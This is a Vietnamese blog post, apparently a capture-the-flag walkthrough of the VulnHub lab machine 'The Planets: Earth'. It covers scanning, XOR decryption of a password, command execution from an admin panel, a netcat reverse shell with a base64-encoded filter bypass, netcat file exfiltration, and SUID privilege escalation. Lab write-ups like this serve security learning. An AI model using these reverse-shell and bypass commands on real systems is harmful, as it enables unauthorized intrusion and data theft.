---
title: "The Planets: Earth Writeup - VulnHub"
date: "2023-07-23 17:18:03"
categories:
  - CTF Writeup
  - VulnHub
tags:
  - The Planets
  - hacking
---

Download [THE PLANETS: EARTH](https://www.vulnhub.com/entry/the-planets-earth,755/)

**Level**: Easy

## Scanning

Tiến hành scan ip máy chủ mục tiêu

```shell
sudo netdiscover -i eth0 -r 10.0.2.0/24
```

![scan ip](/posts/earth-walkthrough/scan-ip.png)

Target IP là `10.0.2.6`. Tiến hành scan all ports:

```shell
nmap -sC -sV 10.0.2.6 -p- -A -T4
```

Đọc thêm về `nmap` tại [đây](/posts/nmap-network-scanner/)

![scan ports](/posts/earth-walkthrough/scan-ports.png)

Chúng ta có thể thấy có 3 port đang mở: 22, 80 và 443. Ngoài ra, phát hiện thêm có domain name `earth.local` và subdomain `terratest.earth.local`.

Truy cập ip máy chủ web cổng 80 và 443 thấy không có gì đặc biệt. Nhưng từ ssl certificate ta khai được ở trên, có thể thêm 2 entries này vào `/etc/hosts` và truy cập.

```shell
echo "10.0.2.6 earth.local" >> /etc/hosts && echo "10.0.2.6 terratest.earth.local" >> /etc/hosts
```

![add hostname](/posts/earth-walkthrough/add-hostname.png)

![earth.local](/posts/earth-walkthrough/earth.local.png)

![terratest.earth.local](/posts/earth-walkthrough/terratest.earth.local.png)

## Enumeration

Ở trang `earth.local` phía dưới có 4 dòng message đã được encrypted, liệu có gì ẩn ý trong đây. Vẫn chưa tìm thấy đủ thông tin nên ta tiếp tục khai thác, tiến hành enumerate directories ở cả 2 domain.

![terratest enumeration](/posts/earth-walkthrough/terratest-enum.png)

![earth enumeration](/posts/earth-walkthrough/earth-enum.PNG)

Ta tìm được trang admin login và 1 trang robots.txt. Truy cập _https://terratest.earth.local/robots.txt_ xem thu thập được manh mối nào không.

![robots.txt](/posts/earth-walkthrough/robots.txt.png)

Enum các extension cho file này, cuối cùng nhận được response 200 từ `testingnotes.txt`.

![testingnotes](/posts/earth-walkthrough/testingnotes.PNG)

Từ notes trên ta có thể xác định được rằng thuật toán mã hóa message sử dụng XOR, và nội dung file `testdata.txt` có thể là key. Ngoài ra, xác định được username của admin là `terra`.

![testdata](/posts/earth-walkthrough/testdata.PNG)

Ném từng cái encrypted message vào XOR với key (nội dung file `testdata.txt` trên).

![decode message](/posts/earth-walkthrough/decode-message.PNG)

=> Thu được 1 chuỗi lặp lại "`earthclimatechangebad4humans`". Dùng chuỗi này làm password cho user `terra` để đăng nhập trang /admin

![admin](/posts/earth-walkthrough/admin.PNG)

Login admin thành công! Tại đây có thể chạy câu lệnh từ input và click `Run command` sẽ trả về kết quả.

```shell
find / -name 'user_flag.txt' -exec cat {} \;
```

![user_flag.txt](/posts/earth-walkthrough/user_flag.PNG)

User Flag: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]

## RCE

Tạo 1 listener trên port 9005

```shell
nc -nlvp 9005
```

Thử spawn reverse shell `nc 10.0.2.15 9005 -e /bin/bash`.

![remote forbidden](/posts/earth-walkthrough/remote-forbidden.PNG)

Bị forbidden ư? Làm thế nào để bypass đây. Chợt nhớ ra ta có thể bypass kí tự đặc biệt bằng cách encode base64 câu lệnh, decode và đồng thời đưa nó vào shell thực thi thông qua pipeline `|`.

```shell
┌──(kali㉿kali)-[~]
└─$ echo "nc 10.0.2.15 9005 -e /bin/bash" | base64
bmMgMTAuMC4yLjE1IDkwMDUgLWUgL2Jpbi9iYXNoCg==
```

Spawn Reverse Shell

```shell
echo "bmMgMTAuMC4yLjE1IDkwMDUgLWUgL2Jpbi9iYXNoCg==" | base64 -d | bash
```

![remote forbidden](/posts/earth-walkthrough/RCE.PNG)

RCE thành công! Nhiệm vụ tiếp theo là leo root và tìm root flag.

## Privilege Escalation

`apache` là user hiện tại, mục tiêu của chúng ta là leo lên quyền cao nhất - root.

Đầu tiên, liệt kê tất cả các file có suid

```shell
find / -perm -u=s 2>/dev/null
```

![find-suid-perm](/posts/earth-walkthrough/find-suid-perm.png)

Check thấy 1 file lạ `reset_root`, nhìn cũng có vẻ hấp dẫn

Phân tích thấy đây là 1 file thực thi và có chức năng reset password cho `root`.

![analyze-reset-root](/posts/earth-walkthrough/analyze-reset-root.PNG)

Chạy thử và bị failed

![run-reset-root](/posts/earth-walkthrough/run-reset-root.PNG)

Để phân tích được rõ ràng hơn, ta sẽ sử dụng `ltrace`.

Nhưng trước tiên phải truyền file `reset_root` về máy local để phân tích. Searching 1 lúc thấy `netcat` có thể làm được điều này. Đọc thêm [tại đây](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/)

Tại máy local

```shell
nc -l -p 1234 -q 1 > reset_root < /dev/null
```

Tại máy gửi

```shell
cat /usr/bin/reset_root | netcat 10.0.2.15 1234
```

Sau khi transfer thành công, thêm quyền thực thi và dùng `ltrace` phân tích ta thu được:

![ltrace-reset-root](/posts/earth-walkthrough/ltrace-reset-root.png)

Hóa ra là máy chủ chỉ kiểm tra các file mình khoanh đỏ ở trên có tồn tại hay không thôi, nếu tồn tại, các câu lệnh phía dưới sẽ được thực thi, và mật khẩu root sẽ được reset về `Earth`.

Giờ quay lại máy chủ mục tiêu và tạo các file đó, sau đó chạy lại file thực thi.

![reset-root-successfully](/posts/earth-walkthrough/reset-root-successfully.PNG)

Quào, `su root` với password là `Earth` và get root flag thoaiii

![root-flag](/posts/earth-walkthrough/root-flag.PNG)

Root Flag: [root_flag_b0da9554d29db2117b02aa8b66ec492e]
